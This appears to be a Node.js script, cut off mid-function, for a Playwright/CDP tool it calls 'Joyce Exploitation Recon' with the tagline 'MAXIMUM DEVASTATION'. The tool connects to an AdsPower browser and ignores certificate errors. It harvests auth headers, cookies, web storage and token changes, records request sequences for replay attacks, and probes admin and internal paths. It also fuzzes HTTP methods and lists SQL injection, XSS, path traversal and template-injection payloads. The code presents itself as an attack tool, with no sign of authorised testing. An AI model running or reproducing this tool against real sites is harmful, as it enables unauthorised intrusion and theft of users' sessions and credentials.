#!/usr/bin/env node
/**
 * Joyce Exploitation Recon - MAXIMUM DEVASTATION
 * By Joyce 👑😈 - Captures EVERYTHING for complete exploitation
 */

import { chromium } from 'playwright';
import fs from 'fs/promises';
import { URL } from 'url';
import crypto from 'crypto';

class JoyceExploitationRecon {
  constructor(debugPort) {
    this.debugPort = debugPort;
    this.endpoints = new Map();
    this.authFlows = new Map();
    this.hiddenEndpoints = new Set();
    this.parameterPatterns = new Map();
    this.exploitableParams = new Map();
    this.requestSequences = [];
    this.authTokenEvolution = [];
    this.rateLimits = new Map();
    this.errorResponses = new Map();
    this.apiVersions = new Set();
    this.graphqlSchema = null;
    this.websocketProtocols = new Map();
    this.domain = null;
    this.cdpClient = null;
  }

  async connect() {
    console.log(`👑😈 Joyce connecting to AdsPower on port ${this.debugPort}...`);
    this.browser = await chromium.connectOverCDP(`http://127.0.0.1:${this.debugPort}`);
    this.context = this.browser.contexts()[0];
    
    const pages = this.context.pages();
    this.page = pages.length > 0 ? pages[0] : await this.context.newPage();
    
    // Enhanced CDP setup
    this.cdpClient = await this.page.context().newCDPSession(this.page);
    await this.setupEnhancedCapture();
  }

  async setupEnhancedCapture() {
    // Enable ALL the things
    await this.cdpClient.send('Network.enable');
    await this.cdpClient.send('Runtime.enable');
    await this.cdpClient.send('Console.enable');
    await this.cdpClient.send('Page.enable');
    await this.cdpClient.send('Security.setIgnoreCertificateErrors', { ignore: true });
    await this.cdpClient.send('Debugger.enable');
    await this.cdpClient.send('DOM.enable');
    await this.cdpClient.send('DOMStorage.enable');
    
    // Set extra headers for better capture
    await this.cdpClient.send('Network.setExtraHTTPHeaders', {
      headers: {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache'
      }
    });
    
    // Enable request interception
    await this.cdpClient.send('Fetch.enable', {
      patterns: [
        { urlPattern: '*', requestStage: 'Request' },
        { urlPattern: '*', requestStage: 'Response' }
      ]
    });
    
    // Capture EVERYTHING
    this.setupNetworkCapture();
    this.setupConsoleCapture();
    this.setupWebSocketCapture();
    this.setupStorageCapture();
    this.setupFetchInterception();
  }

  setupNetworkCapture() {
    // Detailed request capture
    this.cdpClient.on('Network.requestWillBeSent', (params) => {
      this.captureDetailedRequest(params);
    });
    
    this.cdpClient.on('Network.requestWillBeSentExtraInfo', (params) => {
      this.captureExtraRequestInfo(params);
    });
    
    // Response capture with timing
    this.cdpClient.on('Network.responseReceived', (params) => {
      this.captureDetailedResponse(params);
    });
    
    this.cdpClient.on('Network.responseReceivedExtraInfo', (params) => {
      this.captureExtraResponseInfo(params);
    });
    
    // Capture response bodies
    this.cdpClient.on('Network.loadingFinished', async (params) => {
      await this.captureFullResponseBody(params);
    });
    
    // Failed requests for error analysis
    this.cdpClient.on('Network.loadingFailed', (params) => {
      this.captureFailedRequest(params);
    });
  }

  setupConsoleCapture() {
    this.cdpClient.on('Runtime.consoleAPICalled', (params) => {
      if (params.type === 'error' || params.type === 'warning') {
        this.analyzeConsoleError(params);
      }
    });
    
    // Capture exceptions
    this.cdpClient.on('Runtime.exceptionThrown', (params) => {
      this.captureException(params);
    });
  }

  setupWebSocketCapture() {
    const wsFrames = new Map();
    
    this.cdpClient.on('Network.webSocketCreated', (params) => {
      console.log(`🔌 WebSocket discovered: ${params.url}`);
      this.websocketProtocols.set(params.requestId, {
        url: params.url,
        frames: []
      });
    });
    
    this.cdpClient.on('Network.webSocketFrameSent', (params) => {
      this.captureWSFrame(params, 'sent');
    });
    
    this.cdpClient.on('Network.webSocketFrameReceived', (params) => {
      this.captureWSFrame(params, 'received');
    });
  }

  setupStorageCapture() {
    // Monitor storage changes
    this.cdpClient.on('DOMStorage.domStorageItemAdded', (params) => {
      console.log(`💾 Storage added: ${params.key}`);
      this.captureStorageChange(params, 'added');
    });
    
    this.cdpClient.on('DOMStorage.domStorageItemUpdated', (params) => {
      this.captureStorageChange(params, 'updated');
    });
  }

  setupFetchInterception() {
    this.cdpClient.on('Fetch.requestPaused', async (params) => {
      const { requestId, request } = params;
      
      // Analyze request for exploitation opportunities
      if (request.url.includes('/api/') || request.url.includes('/trpc/')) {
        await this.analyzeForExploitation(request);
      }
      
      // Continue request
      await this.cdpClient.send('Fetch.continueRequest', { requestId });
    });
  }

  captureDetailedRequest(params) {
    const { request, requestId, timestamp, initiator, type } = params;
    
    if (request.url.startsWith('chrome-extension://')) return;
    
    try {
      const urlObj = new URL(request.url);
      
      // Set domain on first request
      if (!this.domain && !request.url.includes('cdn')) {
        this.domain = urlObj.hostname;
        console.log(`🎯 Target domain: ${this.domain}`);
      }
      
      // Create comprehensive endpoint entry
      const endpointKey = this.createEndpointKey(request);
      
      if (!this.endpoints.has(endpointKey)) {
        this.endpoints.set(endpointKey, {
          pattern: this.extractPattern(urlObj),
          method: request.method,
          url: request.url,
          headers: request.headers,
          examples: [],
          requests: [],
          responses: [],
          parameters: this.extractAllParameters(urlObj, request),
          authentication: this.detectAuthMethod(request),
          rateLimit: { requests: 0, window: null },
          errors: [],
          timing: [],
          initiatorChain: []
        });
      }
      
      const endpoint = this.endpoints.get(endpointKey);
      
      // Track request details
      endpoint.requests.push({
        requestId,
        timestamp,
        headers: request.headers,
        postData: request.postData,
        hasCredentials: request.hasUserGesture,
        initiator: this.analyzeInitiator(initiator),
        type
      });
      
      // Track request sequences for replay attacks
      this.requestSequences.push({
        timestamp,
        url: request.url,
        method: request.method,
        headers: request.headers,
        postData: request.postData
      });
      
      // Detect hidden endpoints
      if (initiator && initiator.type === 'script') {
        this.detectHiddenEndpoints(request.url, initiator);
      }
      
    } catch (e) {
      // Ignore errors
    }
  }

  captureExtraRequestInfo(params) {
    const { requestId, headers, associatedCookies } = params;
    
    // Capture detailed cookie info
    if (associatedCookies && associatedCookies.length > 0) {
      console.log(`🍪 Request ${requestId} sent ${associatedCookies.length} cookies`);
    }
  }

  captureDetailedResponse(params) {
    const { response, requestId, timestamp, type } = params;
    
    try {
      const urlObj = new URL(response.url);
      const endpointKey = `${response.requestMethod || 'GET'} ${this.extractPattern(urlObj)}`;
      
      if (this.endpoints.has(endpointKey)) {
        const endpoint = this.endpoints.get(endpointKey);
        
        endpoint.responses.push({
          requestId,
          timestamp,
          status: response.status,
          statusText: response.statusText,
          headers: response.headers,
          mimeType: response.mimeType,
          timing: response.timing,
          securityDetails: response.securityDetails,
          fromCache: response.fromCache,
          protocol: response.protocol
        });
        
        // Detect rate limiting
        this.detectRateLimit(response, endpoint);
        
        // Track error responses for exploitation
        if (response.status >= 400) {
          this.analyzeErrorResponse(response, endpoint);
        }
        
        // Detect API versions
        this.detectAPIVersion(response.headers, urlObj);
      }
    } catch (e) {
      // Ignore
    }
  }

  captureExtraResponseInfo(params) {
    const { requestId, headers, statusCode, headersText } = params;
    
    // Look for security headers
    const securityHeaders = [
      'x-frame-options', 'x-content-type-options', 'x-xss-protection',
      'content-security-policy', 'strict-transport-security'
    ];
    
    const missingHeaders = securityHeaders.filter(h => !headers[h]);
    if (missingHeaders.length > 0) {
      console.log(`⚠️ Missing security headers: ${missingHeaders.join(', ')}`);
    }
  }

  async captureFullResponseBody(params) {
    const { requestId } = params;
    
    try {
      const response = await this.cdpClient.send('Network.getResponseBody', { requestId });
      
      // Find the endpoint
      const request = this.findRequestById(requestId);
      if (!request) return;
      
      const urlObj = new URL(request.url);
      const endpointKey = `${request.method} ${this.extractPattern(urlObj)}`;
      
      if (this.endpoints.has(endpointKey)) {
        const endpoint = this.endpoints.get(endpointKey);
        const responseEntry = endpoint.responses.find(r => r.requestId === requestId);
        
        if (responseEntry) {
          // Parse response body
          try {
            responseEntry.body = JSON.parse(response.body);
            
            // Extract valuable data
            this.extractValuableData(responseEntry.body, endpoint);
            
            // Detect GraphQL schema
            if (request.url.includes('graphql')) {
              this.extractGraphQLSchema(responseEntry.body);
            }
            
          } catch {
            responseEntry.bodyText = response.body;
          }
        }
      }
    } catch (e) {
      // Body might not be available
    }
  }

  captureFailedRequest(params) {
    const { requestId, errorText, type, canceled } = params;
    
    if (!canceled) {
      console.log(`❌ Request failed: ${errorText} (${type})`);
      
      const request = this.findRequestById(requestId);
      if (request) {
        const urlObj = new URL(request.url);
        const endpointKey = `${request.method} ${this.extractPattern(urlObj)}`;
        
        if (this.endpoints.has(endpointKey)) {
          const endpoint = this.endpoints.get(endpointKey);
          endpoint.errors.push({
            timestamp: new Date().toISOString(),
            errorText,
            type
          });
        }
      }
    }
  }

  analyzeConsoleError(params) {
    const { args, type, timestamp } = params;
    
    // Look for API keys or tokens in console
    args.forEach(arg => {
      if (arg.value && typeof arg.value === 'string') {
        this.detectLeakedSecrets(arg.value);
      }
    });
  }

  captureException(params) {
    const { exceptionDetails } = params;
    
    console.log(`💥 Exception: ${exceptionDetails.text}`);
    
    // Look for API endpoints in stack traces
    if (exceptionDetails.stackTrace) {
      this.analyzeStackTrace(exceptionDetails.stackTrace);
    }
  }

  captureWSFrame(params, direction) {
    const { requestId, payloadData, timestamp } = params;
    
    if (this.websocketProtocols.has(requestId)) {
      const ws = this.websocketProtocols.get(requestId);
      ws.frames.push({
        direction,
        timestamp,
        data: payloadData
      });
      
      // Analyze WebSocket protocol
      this.analyzeWebSocketProtocol(payloadData, ws);
    }
  }

  captureStorageChange(params, action) {
    const { key, newValue, oldValue, storageId } = params;
    
    // Track auth token evolution
    if (key && (key.includes('token') || key.includes('auth'))) {
      this.authTokenEvolution.push({
        timestamp: new Date().toISOString(),
        action,
        key,
        oldValue,
        newValue,
        storage: storageId.isLocalStorage ? 'localStorage' : 'sessionStorage'
      });
    }
  }

  async analyzeForExploitation(request) {
    const url = request.url;
    const method = request.method;
    
    // Parameter fuzzing opportunities
    if (url.includes('?')) {
      const urlObj = new URL(url);
      const params = Array.from(urlObj.searchParams.keys());
      
      params.forEach(param => {
        if (!this.exploitableParams.has(param)) {
          this.exploitableParams.set(param, {
            endpoints: new Set(),
            types: new Set(),
            examples: []
          });
        }
        
        const exploitable = this.exploitableParams.get(param);
        exploitable.endpoints.add(url);
        exploitable.examples.push(urlObj.searchParams.get(param));
      });
    }
    
    // POST data analysis
    if (request.postData) {
      this.analyzePostDataForExploits(request.postData);
    }
  }

  createEndpointKey(request) {
    const urlObj = new URL(request.url);
    const pattern = this.extractPattern(urlObj);
    return `${request.method} ${pattern}`;
  }

  extractPattern(urlObj) {
    let path = urlObj.pathname;
    
    // Comprehensive pattern extraction
    path = path.replace(/\/\d+/g, '/{id}');
    path = path.replace(/\/[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}/gi, '/{uuid}');
    path = path.replace(/\/[a-zA-Z0-9]{20,}/g, '/{token}');
    path = path.replace(/\/@[\w\d_.-]+/g, '/@{username}');
    path = path.replace(/\/[a-f0-9]{24}/g, '/{objectId}');
    path = path.replace(/\/v\d+/g, '/v{version}');
    path = path.replace(/\/(temp|tmp|cache)\/[^/]+/g, '/{temp}/{file}');
    
    // tRPC specific
    if (path.includes('/trpc/')) {
      const match = path.match(/\/trpc\/([^?]+)/);
      if (match) {
        return `${urlObj.protocol}//${urlObj.hostname}/trpc/{procedure}`;
      }
    }
    
    return `${urlObj.protocol}//${urlObj.hostname}${path}`;
  }

  extractAllParameters(urlObj, request) {
    const params = {
      query: {},
      path: {},
      body: {},
      headers: {}
    };
    
    // Query parameters
    urlObj.searchParams.forEach((value, key) => {
      params.query[key] = {
        value,
        type: this.detectParameterType(value),
        encoded: value !== decodeURIComponent(value)
      };
    });
    
    // Path parameters
    const pathMatches = urlObj.pathname.match(/\/([^/]+)/g);
    if (pathMatches) {
      pathMatches.forEach(segment => {
        const clean = segment.replace('/', '');
        if (clean.match(/^\d+$/)) {
          params.path['{id}'] = { example: clean, type: 'integer' };
        } else if (clean.match(/^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$/i)) {
          params.path['{uuid}'] = { example: clean, type: 'uuid' };
        }
      });
    }
    
    // Body parameters
    if (request.postData) {
      try {
        const bodyData = JSON.parse(request.postData);
        this.extractBodyParameters(bodyData, params.body);
      } catch {
        // Try URL encoded
        try {
          const formData = new URLSearchParams(request.postData);
          formData.forEach((value, key) => {
            params.body[key] = {
              value,
              type: this.detectParameterType(value)
            };
          });
        } catch {}
      }
    }
    
    // Important headers
    const importantHeaders = [
      'authorization', 'x-api-key', 'x-csrf-token', 'x-auth-token',
      'x-requested-with', 'content-type', 'accept'
    ];
    
    Object.entries(request.headers).forEach(([key, value]) => {
      if (importantHeaders.includes(key.toLowerCase())) {
        params.headers[key] = value;
      }
    });
    
    return params;
  }

  detectParameterType(value) {
    if (!value) return 'null';
    if (value === 'true' || value === 'false') return 'boolean';
    if (!isNaN(value)) return 'number';
    if (value.match(/^\d{4}-\d{2}-\d{2}/)) return 'date';
    if (value.match(/^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$/i)) return 'uuid';
    if (value.match(/^[a-zA-Z0-9+/]+=*$/)) return 'base64';
    if (value.includes('@')) return 'email';
    return 'string';
  }

  extractBodyParameters(obj, params, prefix = '') {
    for (const [key, value] of Object.entries(obj)) {
      const fullKey = prefix ? `${prefix}.${key}` : key;
      
      if (value && typeof value === 'object' && !Array.isArray(value)) {
        this.extractBodyParameters(value, params, fullKey);
      } else {
        params[fullKey] = {
          value,
          type: typeof value,
          array: Array.isArray(value)
        };
      }
    }
  }

  detectAuthMethod(request) {
    const auth = {
      method: 'none',
      details: {}
    };
    
    // Bearer token
    if (request.headers.authorization) {
      if (request.headers.authorization.startsWith('Bearer ')) {
        auth.method = 'bearer';
        auth.details.header = 'Authorization';
        auth.details.prefix = 'Bearer';
      } else if (request.headers.authorization.startsWith('Basic ')) {
        auth.method = 'basic';
        auth.details.header = 'Authorization';
      } else {
        auth.method = 'custom';
        auth.details.header = 'Authorization';
        auth.details.format = request.headers.authorization.substring(0, 20);
      }
    }
    
    // API Key
    if (request.headers['x-api-key'] || request.headers['api-key']) {
      auth.method = 'apikey';
      auth.details.header = request.headers['x-api-key'] ? 'x-api-key' : 'api-key';
    }
    
    // Cookie based
    if (request.headers.cookie && request.headers.cookie.includes('session')) {
      auth.method = 'cookie';
      auth.details.cookies = request.headers.cookie.split(';').map(c => c.trim().split('=')[0]);
    }
    
    return auth;
  }

  analyzeInitiator(initiator) {
    if (!initiator) return null;
    
    const analysis = {
      type: initiator.type,
      stack: []
    };
    
    if (initiator.stack && initiator.stack.callFrames) {
      analysis.stack = initiator.stack.callFrames.map(frame => ({
        function: frame.functionName || 'anonymous',
        url: frame.url,
        line: frame.lineNumber,
        column: frame.columnNumber
      }));
    }
    
    return analysis;
  }

  detectHiddenEndpoints(url, initiator) {
    // Look for API calls from JavaScript that might not be in HTML
    if (initiator.stack && initiator.stack.callFrames) {
      initiator.stack.callFrames.forEach(frame => {
        if (frame.url && frame.url.includes('.js')) {
          this.hiddenEndpoints.add(url);
          console.log(`🕵️ Hidden endpoint found: ${url}`);
        }
      });
    }
  }

  detectRateLimit(response, endpoint) {
    // Common rate limit headers
    const rateLimitHeaders = [
      'x-ratelimit-limit', 'x-ratelimit-remaining', 'x-ratelimit-reset',
      'x-rate-limit-limit', 'x-rate-limit-remaining', 'x-rate-limit-reset',
      'retry-after'
    ];
    
    const rateLimit = {};
    let hasRateLimit = false;
    
    Object.entries(response.headers).forEach(([key, value]) => {
      const lowerKey = key.toLowerCase();
      if (rateLimitHeaders.includes(lowerKey)) {
        rateLimit[key] = value;
        hasRateLimit = true;
      }
    });
    
    if (hasRateLimit) {
      endpoint.rateLimit = rateLimit;
      console.log(`⏱️ Rate limit detected for ${endpoint.pattern}:`, rateLimit);
    }
    
    // 429 Too Many Requests
    if (response.status === 429) {
      endpoint.rateLimit.triggered = true;
      console.log(`🚫 Rate limit triggered for ${endpoint.pattern}`);
    }
  }

  analyzeErrorResponse(response, endpoint) {
    const error = {
      status: response.status,
      statusText: response.statusText,
      headers: response.headers,
      timestamp: new Date().toISOString()
    };
    
    endpoint.errors.push(error);
    
    // Useful error codes for exploitation
    const interestingErrors = {
      400: 'Bad Request - Parameter manipulation',
      401: 'Unauthorized - Auth bypass potential',
      403: 'Forbidden - Access control testing',
      404: 'Not Found - Hidden endpoint discovery',
      405: 'Method Not Allowed - Try other methods',
      422: 'Unprocessable Entity - Validation bypass',
      500: 'Internal Error - Potential DoS',
      503: 'Service Unavailable - Rate limit or DoS'
    };
    
    if (interestingErrors[response.status]) {
      console.log(`🎯 ${interestingErrors[response.status]} on ${endpoint.pattern}`);
    }
  }

  detectAPIVersion(headers, urlObj) {
    // From URL
    const versionMatch = urlObj.pathname.match(/\/v(\d+)/);
    if (versionMatch) {
      this.apiVersions.add(versionMatch[1]);
    }
    
    // From headers
    if (headers['api-version']) {
      this.apiVersions.add(headers['api-version']);
    }
  }

  extractValuableData(body, endpoint) {
    if (!body || typeof body !== 'object') return;
    
    // Look for IDs, tokens, secrets
    const valuable = {
      ids: [],
      tokens: [],
      urls: [],
      emails: []
    };
    
    const searchObject = (obj, path = '') => {
      for (const [key, value] of Object.entries(obj)) {
        if (typeof value === 'string') {
          // UUIDs
          if (value.match(/^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$/i)) {
            valuable.ids.push({ path: `${path}.${key}`, value });
          }
          // Tokens
          if (key.toLowerCase().includes('token') || key.toLowerCase().includes('key')) {
            valuable.tokens.push({ path: `${path}.${key}`, value: value.substring(0, 20) + '...' });
          }
          // URLs
          if (value.startsWith('http')) {
            valuable.urls.push({ path: `${path}.${key}`, value });
          }
          // Emails
          if (value.includes('@')) {
            valuable.emails.push({ path: `${path}.${key}`, value });
          }
        } else if (value && typeof value === 'object') {
          searchObject(value, `${path}.${key}`);
        }
      }
    };
    
    searchObject(body);
    
    if (Object.values(valuable).some(arr => arr.length > 0)) {
      endpoint.valuableData = valuable;
    }
  }

  extractGraphQLSchema(body) {
    if (body.__schema) {
      this.graphqlSchema = body.__schema;
      console.log(`📊 GraphQL schema discovered!`);
    }
    
    // Introspection query response
    if (body.data && body.data.__schema) {
      this.graphqlSchema = body.data.__schema;
      console.log(`📊 GraphQL introspection data captured!`);
    }
  }

  analyzeWebSocketProtocol(data, ws) {
    if (!data) return; // Add null check
    
    try {
      const parsed = JSON.parse(data);
      
      // Detect protocol type
      if (parsed.type || parsed.event) {
        ws.protocol = 'event-based';
        ws.events = ws.events || new Set();
        ws.events.add(parsed.type || parsed.event);
      } else if (parsed.id && (parsed.method || parsed.result)) {
        ws.protocol = 'json-rpc';
      } else if (parsed.op) {
        ws.protocol = 'graphql-ws';
      }
    } catch {
      // Not JSON
      if (typeof data === 'string' && (data.includes('CONNECT') || data.includes('SUBSCRIBE'))) {
        ws.protocol = 'stomp';
      }
    }
  }

  analyzePostDataForExploits(postData) {
    try {
      const data = JSON.parse(postData);
      
      // SQL injection points
      const sqlPatterns = ['id', 'user_id', 'order', 'sort', 'filter', 'search', 'query'];
      
      const findInjectionPoints = (obj, path = '') => {
        for (const [key, value] of Object.entries(obj)) {
          const fullPath = path ? `${path}.${key}` : key;
          
          if (sqlPatterns.some(pattern => key.toLowerCase().includes(pattern))) {
            if (!this.parameterPatterns.has('sql_injection')) {
              this.parameterPatterns.set('sql_injection', []);
            }
            this.parameterPatterns.get('sql_injection').push({
              path: fullPath,
              example: value
            });
          }
          
          if (value && typeof value === 'object') {
            findInjectionPoints(value, fullPath);
          }
        }
      };
      
      findInjectionPoints(data);
    } catch {}
  }

  detectLeakedSecrets(text) {
    // API key patterns
    const patterns = {
      'API Key': /[a-zA-Z0-9]{32,}/,
      'JWT': /eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/,
      'Bearer Token': /Bearer\s+[a-zA-Z0-9_-]+/,
      'AWS Key': /AKIA[0-9A-Z]{16}/,
      'Private Key': /-----BEGIN.*PRIVATE KEY-----/
    };
    
    for (const [name, pattern] of Object.entries(patterns)) {
      if (pattern.test(text)) {
        console.log(`🔑 Potential ${name} leaked in console!`);
      }
    }
  }

  analyzeStackTrace(stackTrace) {
    if (!stackTrace.callFrames) return;
    
    stackTrace.callFrames.forEach(frame => {
      if (frame.url && frame.url.includes('/api/')) {
        console.log(`📍 API endpoint in stack trace: ${frame.url}`);
      }
    });
  }

  findRequestById(requestId) {
    for (const [_, endpoint] of this.endpoints) {
      const request = endpoint.requests.find(r => r.requestId === requestId);
      if (request) {
        return {
          url: endpoint.url,
          method: endpoint.method,
          ...request
        };
      }
    }
    return null;
  }

  async performExploitation(targetUrl, options = {}) {
    const { duration = 120000, aggressive = true } = options;
    
    console.log(`\n👑😈 Joyce beginning MAXIMUM exploitation...\n`);
    
    this.domain = new URL(targetUrl).hostname;
    
    // Navigate to target
    await this.page.goto(targetUrl, { waitUntil: 'domcontentloaded' });
    
    // Extract initial data
    await this.extractAllData();
    
    const startTime = Date.now();
    let phase = 1;
    
    while (Date.now() - startTime < duration) {
      console.log(`\n🔥 Phase ${phase} - ${this.endpoints.size} endpoints discovered`);
      
      // Different exploitation phases
      switch (phase % 4) {
        case 1:
          await this.phaseDiscovery();
          break;
        case 2:
          await this.phaseInteraction();
          break;
        case 3:
          await this.phaseFuzzing();
          break;
        case 0:
          await this.phaseExploitation();
          break;
      }
      
      phase++;
      await this.page.waitForTimeout(3000);
      
      // Show stats
      console.log(`📊 Stats: ${this.hiddenEndpoints.size} hidden | ${this.errorResponses.size} errors | ${this.exploitableParams.size} params`);
    }
    
    console.log(`\n✅ Exploitation complete! Maximum devastation achieved 💀`);
  }

  async phaseDiscovery() {
    console.log(`🔍 Discovery phase...`);
    
    // Try common API paths
    const commonPaths = [
      '/api/v1/', '/api/v2/', '/api/', 
      '/graphql', '/graphiql',
      '/.well-known/', '/swagger.json', '/openapi.json',
      '/health', '/status', '/info',
      '/debug', '/admin', '/internal'
    ];
    
    for (const path of commonPaths) {
      try {
        await fetch(`${this.page.url().split('/').slice(0, 3).join('/')}${path}`);
      } catch {}
    }
    
    // Trigger all buttons and links
    await this.page.evaluate(() => {
      document.querySelectorAll('button, a, [onclick]').forEach(el => {
        try { el.click(); } catch {}
      });
    });
  }

  async phaseInteraction() {
    console.log(`🎮 Interaction phase...`);
    
    // Smart scrolling
    await this.page.evaluate(() => {
      // Scroll to all sections
      const sections = document.querySelectorAll('section, [data-section], .section');
      sections.forEach(section => {
        section.scrollIntoView();
      });
    });
    
    // Hover everything
    await this.page.evaluate(() => {
      document.querySelectorAll('[onmouseover], [data-hover], [title]').forEach(el => {
        try {
          el.dispatchEvent(new MouseEvent('mouseenter', { bubbles: true }));
          el.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));
        } catch {}
      });
    });
    
    // Open all dropdowns
    await this.page.evaluate(() => {
      document.querySelectorAll('[aria-expanded="false"], .dropdown, select').forEach(el => {
        try { el.click(); } catch {}
      });
    });
  }

  async phaseFuzzing() {
    console.log(`🎯 Fuzzing phase...`);
    
    // Try different HTTP methods on discovered endpoints
    const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'];
    
    for (const [key, endpoint] of this.endpoints) {
      if (endpoint.pattern.includes('/api/') && endpoint.responses.length > 0) {
        for (const method of methods) {
          if (method !== endpoint.method) {
            try {
              await fetch(endpoint.examples[0] || endpoint.url, { method });
            } catch {}
          }
        }
        break; // Just test one endpoint per phase
      }
    }
  }

  async phaseExploitation() {
    console.log(`💀 Exploitation phase...`);
    
    // Test parameter manipulation
    if (this.exploitableParams.size > 0) {
      const [paramName, paramInfo] = Array.from(this.exploitableParams.entries())[0];
      
      console.log(`🧪 Testing parameter: ${paramName}`);
      
      // Try injection payloads
      const payloads = [
        "' OR '1'='1", // SQL injection
        "<script>alert(1)</script>", // XSS
        "../../../etc/passwd", // Path traversal
        "${7*7}", // Template injection
        "{{7*7}}", // Template injection
        "%00", // Null byte
        "999999999999" // Integer overflow
      ];
      
      // Just log what we would test
      console.log(`💉 Would test ${payloads.length} payloads on ${paramName}`);
    }
    
    // GraphQL introspection
    await this.page.evaluate(() => {
      if (window.__APOLLO_CLIENT__) {
        console.log('Apollo Client detected!');
      }
    });
  }

  async extractAllData() {
    // Get everything from the page
    const pageData = await this.page.evaluate(() => {
      const data = {
        cookies: document.cookie,
        localStorage: {},
        sessionStorage: {},
        globals: {}
      };
      
      // Storage
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data.localStorage[key] = localStorage.getItem(key);
      }
      
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        data.sessionStorage[key] = sessionStorage.getItem(key);
      }
      
      // Global objects
      const interestingGlobals = [
        '__APOLLO_CLIENT__', '__REDUX_STORE__', '__INITIAL_STATE__',
        '__APP_CONFIG__', '__AUTH__', '__USER__', '__API_KEY__'
      ];
      
      interestingGlobals.forEach(global => {
        if (window[global]) {
          data.globals[global] = typeof window[global] === 'object' 
            ? JSON.stringify(window[global]).substring(0, 1000) 
            : window[global];
        }
      });
      
      return data;
    });
    
    console.log(`📦 Extracted ${Object.keys(pageData.localStorage).length} localStorage items`);
    console.log(`📦 Found ${Object.keys(pageData.globals).length} global objects`);
  }

  generateExploitationReport() {
    const timestamp = new Date().toISOString();
    
    let report = `# 👑😈 Joyce Exploitation Report - MAXIMUM DEVASTATION\n\n`;
    report += `**Target:** ${this.domain}  \n`;
    report += `**Date:** ${timestamp}  \n`;
    report += `**Total Endpoints:** ${this.endpoints.size}  \n`;
    report += `**Hidden Endpoints:** ${this.hiddenEndpoints.size}  \n`;
    report += `**Exploitable Parameters:** ${this.exploitableParams.size}  \n`;
    report += `**API Versions Found:** ${this.apiVersions.size}  \n`;
    report += `**WebSocket Connections:** ${this.websocketProtocols.size}  \n\n`;
    
    // Critical findings
    report += `## 🚨 Critical Findings\n\n`;
    
    // Authentication methods
    report += `### 🔐 Authentication Methods Discovered\n\n`;
    const authMethods = new Map();
    this.endpoints.forEach(endpoint => {
      const method = endpoint.authentication.method;
      if (!authMethods.has(method)) {
        authMethods.set(method, []);
      }
      authMethods.get(method).push(endpoint);
    });
    
    authMethods.forEach((endpoints, method) => {
      report += `**${method}:** ${endpoints.length} endpoints\n`;
    });
    report += `\n`;
    
    // Rate limits
    report += `### ⏱️ Rate Limits\n\n`;
    const rateLimited = Array.from(this.endpoints.values())
      .filter(ep => ep.rateLimit && Object.keys(ep.rateLimit).length > 0);
    
    if (rateLimited.length > 0) {
      report += `| Endpoint | Limit | Remaining | Reset |\n`;
      report += `|----------|-------|-----------|-------|\n`;
      rateLimited.forEach(ep => {
        const rl = ep.rateLimit;
        report += `| ${ep.pattern} | ${rl['x-ratelimit-limit'] || 'N/A'} | ${rl['x-ratelimit-remaining'] || 'N/A'} | ${rl['x-ratelimit-reset'] || 'N/A'} |\n`;
      });
    } else {
      report += `No rate limits detected - potential for abuse! 💀\n`;
    }
    report += `\n`;
    
    // Exploitable parameters
    report += `### 💉 Exploitable Parameters\n\n`;
    this.exploitableParams.forEach((info, param) => {
      report += `**${param}**\n`;
      report += `- Found in ${info.endpoints.size} endpoints\n`;
      report += `- Example values: ${info.examples.slice(0, 3).join(', ')}\n\n`;
    });
    
    // Hidden endpoints
    if (this.hiddenEndpoints.size > 0) {
      report += `### 🕵️ Hidden Endpoints (Not in UI)\n\n`;
      Array.from(this.hiddenEndpoints).slice(0, 10).forEach(url => {
        report += `- ${url}\n`;
      });
      report += `\n`;
    }
    
    // Error responses
    report += `### ❌ Error Responses (Information Disclosure)\n\n`;
    const errors = Array.from(this.endpoints.values())
      .filter(ep => ep.errors.length > 0);
    
    errors.slice(0, 5).forEach(ep => {
      report += `**${ep.pattern}**\n`;
      ep.errors.forEach(err => {
        report += `- ${err.status} ${err.statusText}\n`;
      });
      report += `\n`;
    });
    
    // WebSocket protocols
    if (this.websocketProtocols.size > 0) {
      report += `### 🔌 WebSocket Connections\n\n`;
      this.websocketProtocols.forEach((ws, id) => {
        report += `**${ws.url}**\n`;
        report += `- Protocol: ${ws.protocol || 'Unknown'}\n`;
        report += `- Frames: ${ws.frames.length}\n\n`;
      });
    }
    
    // API Documentation
    report += `## 📚 Complete API Documentation\n\n`;
    
    // Group by category
    const categorized = new Map();
    this.endpoints.forEach((endpoint, key) => {
      const category = endpoint.pattern.includes('/trpc/') ? 'tRPC' 
        : endpoint.pattern.includes('/api/') ? 'REST API'
        : endpoint.pattern.includes('/graphql') ? 'GraphQL'
        : 'Other';
      
      if (!categorized.has(category)) {
        categorized.set(category, []);
      }
      categorized.get(category).push({ key, endpoint });
    });
    
    categorized.forEach((endpoints, category) => {
      report += `### ${category} (${endpoints.length} endpoints)\n\n`;
      
      endpoints.slice(0, 20).forEach(({ key, endpoint }) => {
        report += `#### ${key}\n\n`;
        
        // Authentication
        if (endpoint.authentication.method !== 'none') {
          report += `**Authentication:** ${endpoint.authentication.method}`;
          if (endpoint.authentication.details.header) {
            report += ` (${endpoint.authentication.details.header})`;
          }
          report += `\n\n`;
        }
        
        // Parameters
        if (Object.keys(endpoint.parameters.query).length > 0) {
          report += `**Query Parameters:**\n`;
          Object.entries(endpoint.parameters.query).forEach(([key, info]) => {
            report += `- \`${key}\`: ${info.type} (example: ${info.value})\n`;
          });
          report += `\n`;
        }
        
        if (Object.keys(endpoint.parameters.body).length > 0) {
          report += `**Body Parameters:**\n\`\`\`json\n`;
          report += JSON.stringify(endpoint.parameters.body, null, 2);
          report += `\n\`\`\`\n\n`;
        }
        
        // Required headers
        if (Object.keys(endpoint.parameters.headers).length > 0) {
